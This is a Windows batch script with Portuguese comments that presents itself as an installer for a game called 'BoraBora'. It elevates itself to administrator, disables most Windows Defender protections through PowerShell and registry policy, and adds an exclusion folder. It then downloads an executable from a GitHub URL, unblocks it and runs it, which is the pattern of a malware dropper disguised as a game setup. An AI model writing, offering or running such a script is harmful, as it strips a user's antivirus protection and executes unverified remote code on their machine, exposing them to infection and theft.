@echo off
setlocal EnableDelayedExpansion

:: --- SCRIPT DEFINITIVO MANUS ---
:: Foco: Desativacao total do Defender e correcao do erro de inicializacao

:: 1. Verificacao de Administrador
net session >nul 2>&1 || (powershell -Command "Start-Process '%~f0' -Verb RunAs" & exit /b)

title Instalador BoraBora - Solucao Definitiva
echo ============================================
echo   DESATIVANDO DEFENDER E PREPARANDO JOGO
echo ============================================

:: 2. Desativacao Agressiva (Powershell + Registry)
echo [+] Desativando todos os modulos do Defender...
powershell -Command "Set-MpPreference -DisableRealtimeMonitoring $true" 2>nul
powershell -Command "Set-MpPreference -DisableBehaviorMonitoring $true" 2>nul
powershell -Command "Set-MpPreference -DisableIOAVProtection $true" 2>nul
powershell -Command "Set-MpPreference -DisableBlockAtFirstSeen $true" 2>nul
powershell -Command "Set-MpPreference -SubmitSamplesConsent 2" 2>nul
powershell -Command "Set-MpPreference -MAPSReporting 0" 2>nul

:: Tenta desativar o servico via registro (metodo persistente)
echo [+] Bloqueando reativacao automatica...
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender" /v "DisableAntiSpyware" /t REG_DWORD /d 1 /f 2>nul
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" /v "DisableRealtimeMonitoring" /t REG_DWORD /d 1 /f 2>nul

:: 3. Criacao de Zona de Exclusao e Pasta de Trabalho
set "URL=https://github.com/romarioeasy/bora/raw/main/borabora.exe"
set "PASTA_APP=C:\BoraJogo"
set "NOME_EXE=borabora.exe"
set "CAMINHO_FULL=%PASTA_APP%\%NOME_EXE%"

if not exist "%PASTA_APP%" mkdir "%PASTA_APP%"
powershell -Command "Add-MpPreference -ExclusionPath '%PASTA_APP%'" 2>nul

:: 4. Download com Verificacao de Integridade
echo [+] Baixando o jogo (aguarde concluir)...
:: Remove arquivo antigo se existir para evitar conflitos
if exist "%CAMINHO_FULL%" del /f /q "%CAMINHO_FULL%"

:: Usa curl com -L (follow redirect) e -f (fail on error)
curl -L -f -o "%CAMINHO_FULL%" "%URL%"

if %errorlevel% neq 0 (
    echo [!] ERRO NO DOWNLOAD: Verifique sua internet ou o link.
    pause
    exit /b
)

:: 5. Correcao do Erro "This application could not be started"
:: Remove o bloqueio de "Arquivo da Internet"
powershell -Command "Unblock-File -Path '%CAMINHO_FULL%'" 2>nul

:: 6. Execucao
echo [+] Iniciando o jogo...
echo.
echo Se o erro persistir, instale o .NET Framework 4.8 e Visual C++ Redist.
echo.
start "" "%CAMINHO_FULL%"

:: Aguarda 2 segundos e fecha
timeout /t 2 >nul
exit
